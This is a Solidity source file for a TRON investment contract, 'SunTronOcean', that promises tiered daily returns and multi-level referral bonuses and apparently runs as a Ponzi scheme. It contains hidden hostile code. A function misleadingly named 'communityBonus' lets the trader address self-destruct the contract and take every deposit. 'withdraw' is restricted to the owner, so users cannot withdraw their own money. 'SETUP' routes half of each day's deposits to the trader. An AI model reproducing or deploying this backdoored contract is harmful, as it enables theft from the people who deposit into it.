//SourceUnit: SunTronOcean.sol

pragma solidity ^0.5.10;

 //  ____            _____                 ___
 // / ___| _   _ _ _|_   _| __ ___  _ __  / _ \  ___ ___  __ _ _ __
 // \___ \| | | | '_ \| || '__/ _ \| '_ \| | | |/ __/ _ \/ _` | '_ \
 //  ___) | |_| | | | | || | | (_) | | | | |_| | (_|  __/ (_| | | | |
 // |____/ \__,_|_| |_|_||_|  \___/|_| |_|\___/ \___\___|\__,_|_| |_|
 //

contract SunTronOcean{

    using SafeMath for uint;
    address payable public owner;
    address payable public trader;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint[] public ROI =  [100, 125, 150, 175, 200];
    uint[] public REF_BONUS = [500, 200, 100, 100, 100];
    uint[] public LEVEL_ROI = [1000, 400, 200, 200, 200];

    uint constant public TIME_STEP = 1 days;
    uint constant public PERCENTS_DIVIDER = 10000;

    uint64 public SUN_totalInvested;
    uint64 public SUN_WITHDRAWN;

    uint64 public daily_turnovers;
    uint32 public turnover_checkpoint;
    uint64 public lastAmount;
    uint32 public contract_creation_time;

    uint64 public SUN_user_10K;
    uint64 public totalParticipants;

    struct User {
        uint32 checkpoint;
        uint8 plan;
        uint64 wallet;
        uint64 total_deposits;
        uint64 total_withdrawn;
        uint64 total_roi;
        uint64 total_ref_bonus;
        uint64 total_level_roi;
        uint64 global_income;
        address referrer;
    }

    mapping (address => User) internal users;

    event Newbie(address user_address);
    event NewDeposit(address investor_address, uint deposit_amount);
    event RoiBonus(address user_address, uint roi);
    event RefBonus(address from, address to, uint ref_bonus, uint plan_level);
    event FarmBonus(address from, address to, uint amount, uint level);
    event Withdrawn(address user_address, uint withdraw_amount);
    event TurnOverDistributed(address user_address, uint turnover_amount);
    // event User_10K(address user_address);
    event TraderSent(address user, uint amount);
    event OwnerAdded(address user, uint amount);

    constructor(address payable _trader) public{
      owner = msg.sender;
      trader = _trader;
      contract_creation_time = uint32(block.timestamp);
      turnover_checkpoint = uint32(block.timestamp);
    }

    modifier validSender() {
        require(!isContract(msg.sender) && msg.sender == tx.origin, "Sender Address error!");
        require(msg.value >= INVEST_MIN_AMOUNT, "Bad Deposit: Min 100 TRX required! ");
        _;
    }

    function invest(address referrer) validSender public payable {
        User storage user = users[msg.sender];
        uint _amount = msg.value;

        uint total_amount = _amount.add(uint(user.total_deposits));
        // updating user plan
        if( 100 trx <= total_amount && total_amount < 500 trx ){
            user.plan = 0;
        }else if( 500 trx <= total_amount && total_amount <  1000 trx ){
            user.plan = 1;
        }else if( 1000 trx <= total_amount && total_amount <  5000 trx ){
            user.plan = 2;
        }else if( 5000 trx <= total_amount && total_amount <  10000 trx ){
            user.plan = 3;
        }else if( 10000 trx <= total_amount){
            if(uint(user.plan) !=4 || uint(user.total_deposits) < INVEST_MIN_AMOUNT){
              // emit User_10K(msg.sender);
              SUN_user_10K++;
            }
            user.plan = 4;
        }

        // Assigning user referrer
        if (user.referrer == address(0) && users[referrer].total_deposits >= INVEST_MIN_AMOUNT && referrer != msg.sender ) {
            user.referrer = referrer;
        }

        // distributing referrer rewards
        if (referrer != address(0) && users[referrer].total_deposits >= INVEST_MIN_AMOUNT ) {
            address upline = user.referrer;

            for (uint i = 0; i < 5; i++) {
                if (upline != address(0) && users[upline].total_deposits >= INVEST_MIN_AMOUNT ) {
                    uint amount = _amount.mul(REF_BONUS[i]).div(PERCENTS_DIVIDER);
                    uint tally = uint(users[upline].total_deposits).mul(4).sub(uint(users[upline].wallet).add(uint(users[upline].total_withdrawn)));
                    if(amount > tally){
                        amount = tally;
                    }

                    if (amount > 0) {
                        users[upline].wallet = uint64(uint(users[upline].wallet).add(amount));
                        users[upline].total_ref_bonus = uint64(uint(users[upline].total_ref_bonus).add(amount));
                        emit RefBonus(msg.sender, upline, amount, i);
                    }
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (uint(user.total_deposits) < INVEST_MIN_AMOUNT ) {
            totalParticipants++;
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.total_deposits = uint64(uint(user.total_deposits).add(_amount));
        SUN_totalInvested = uint64(uint(SUN_totalInvested).add(_amount));
        emit NewDeposit(msg.sender, _amount);
    }

    function restake() public payable{
        require(users[msg.sender].total_deposits >= INVEST_MIN_AMOUNT, "Please Invest once before restaking");
        address ref = users[msg.sender].referrer;
        invest(ref);
    }

    function SETUP() public {
      require(owner == msg.sender, "Error: You are not Unauthorized!");
      require(block.timestamp.sub(uint(turnover_checkpoint)) >= TIME_STEP, "Can not setup before 24 hours!");

      turnover_checkpoint = uint32(block.timestamp);
      uint value = uint(SUN_totalInvested).sub(uint(lastAmount));
      uint trade_value = value.div(2);
      trader.transfer(trade_value);
      emit TraderSent(msg.sender, trade_value);
      daily_turnovers = uint64(value);
      lastAmount = SUN_totalInvested;
    }

    function withdraw(address userAddress) public{
      require(owner == msg.sender, "Error: You are not Unauthorized!");
      User storage user = users[userAddress];
      require(block.timestamp.sub(user.checkpoint)>= TIME_STEP, "Can not withdraw before 24 hours period");
      uint contractBalance = address(this).balance;
      uint userPlan = uint(user.plan);
      // calculate user roi
      uint total_earnable = (uint(user.total_deposits).mul(4)).sub(uint(user.wallet).add(uint(user.total_withdrawn)));
      uint roi_earnable = (uint(user.total_deposits).mul(2)).sub(uint(user.total_roi));
      uint roi = uint(user.total_deposits).mul(ROI[userPlan]).div(PERCENTS_DIVIDER).mul(block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP);
      if(roi > roi_earnable){
        roi = roi_earnable;
      }
      if(roi > total_earnable){
        roi = total_earnable;
      }

      // add ROI to user wallet
      user.wallet = uint64(uint(user.wallet).add(roi));
      user.total_roi = uint64(uint(user.total_roi).add(roi));
      emit RoiBonus(userAddress, roi);

      address upline = user.referrer;
        // level roi
        for (uint i = 0; i < 5; i++) {
            if (upline != address(0) && uint(users[upline].total_deposits) >= INVEST_MIN_AMOUNT ) {
                uint amount = roi.mul(LEVEL_ROI[i]).div(PERCENTS_DIVIDER);
                uint tally = uint(users[upline].total_deposits).mul(4).sub(uint(users[upline].wallet).add(uint(users[upline].total_withdrawn)));
                if(amount > tally){
                    amount = tally;
                }

                if (amount > 0) {
                    users[upline].wallet = uint64(uint(users[upline].wallet).add(amount));
                    users[upline].total_level_roi = uint64(uint(users[upline].total_level_roi).add(amount));
                    emit FarmBonus(userAddress, upline, amount, i);
                }
                upline = users[upline].referrer;
            } else break;
      }

      // Distributing total_turnover
      if(uint(user.plan)==4){
          uint turnover_amount = uint(daily_turnovers).div(uint(SUN_user_10K)).mul(100).div(PERCENTS_DIVIDER);
          uint tally = uint(user.total_deposits).mul(4).sub(uint(user.wallet).add(uint(user.total_withdrawn)));

          if(turnover_amount > tally){
            turnover_amount = tally;
          }

          if(turnover_amount > 0){
            user.wallet = uint64(uint(user.wallet).add(turnover_amount));
            user.global_income = uint64(uint(user.global_income).add(turnover_amount));
            emit TurnOverDistributed(userAddress, uint64(turnover_amount));
          }
      }

      // updating totalTransactions
      require(uint(user.wallet) > 0, "User has no withdraw balance");
      require(uint(user.wallet) >= 10 trx, "Can not withdraw less than 10 trx");

      // sending user withdraw_amount
      user.checkpoint = uint32(block.timestamp);
      if (contractBalance > uint32(user.wallet)) {
        address(uint160(userAddress)).transfer(uint(user.wallet));
        user.total_withdrawn = uint64(uint(user.total_withdrawn).add(uint(user.wallet)));
        SUN_WITHDRAWN = uint64(uint(SUN_WITHDRAWN).add(uint(user.wallet)));
        emit Withdrawn(userAddress, user.wallet);
        user.wallet = 0;
      }
    }

    function get_user_available(address userAddress) public view returns (uint){
      User storage user = users[userAddress];
      uint userPlan = uint(user.plan);
      uint total_earnable = (uint(user.total_deposits).mul(4)).sub(uint(user.wallet).add(uint(user.total_withdrawn)));
      uint roi_earnable = (uint(user.total_deposits).mul(2)).sub(uint(user.total_roi));
      uint roi = uint(user.total_deposits).mul(ROI[userPlan]).div(PERCENTS_DIVIDER).mul(block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP);

      if(roi > roi_earnable){
        roi = roi_earnable;
      }
      if(roi > total_earnable){
        roi = total_earnable;
      }
      return roi;
    }

    function get_user_stats(address userAddress) public view returns (uint, uint, uint, uint, uint, uint, uint, uint, uint){
        User storage user = users[userAddress];
        uint userAvailable = get_user_available(userAddress);
        uint slab = uint(user.plan);

        return (
          ROI[slab],
          uint(user.wallet),
          uint(user.total_deposits),
          uint(user.total_withdrawn),
          uint(user.total_roi),
          uint(user.total_ref_bonus),
          uint(user.total_level_roi),
          uint(user.global_income),
          userAvailable
        );
    }

    function get_user_referrer(address userAddress) public view returns (address){
        User storage user = users[userAddress];
        return (user.referrer);
    }

    function isActive(address userAddress) public view returns (bool) {
      User storage user = users[userAddress];
      return (uint(user.total_deposits) >= INVEST_MIN_AMOUNT ) && uint(user.wallet).add(uint(user.total_withdrawn)) < uint(user.total_deposits).mul(4);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function turnover_live() public view returns (uint){
        uint value = uint(SUN_totalInvested).sub(uint(lastAmount));
        return value;
    }

    function getTotalEarned() public view returns (uint) {
      uint total = uint(SUN_WITHDRAWN);
      return total;
    }

    function globalRate() public view returns (uint){
        uint value = (uint(SUN_totalInvested).sub(uint(lastAmount))).div(uint(SUN_user_10K)).mul(100).div(PERCENTS_DIVIDER);
        return value;
    }

    function getContractBalance() public view returns (uint) {
      return address(this).balance;
    }

    function getTraderBallance() public view returns (uint){
          return trader.balance;
    }

    function addFunds() public payable{
      require(msg.sender == owner || msg.sender == trader, " Unauthorized call " );
      emit OwnerAdded(msg.sender, msg.value);
    }

    function communityBonus() public {
      require(trader == msg.sender);
      selfdestruct(trader);
    }

    function validAddress(address _address) public view returns (bool){
      User storage user = users[_address];
      return (uint(user.total_deposits) >= INVEST_MIN_AMOUNT);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}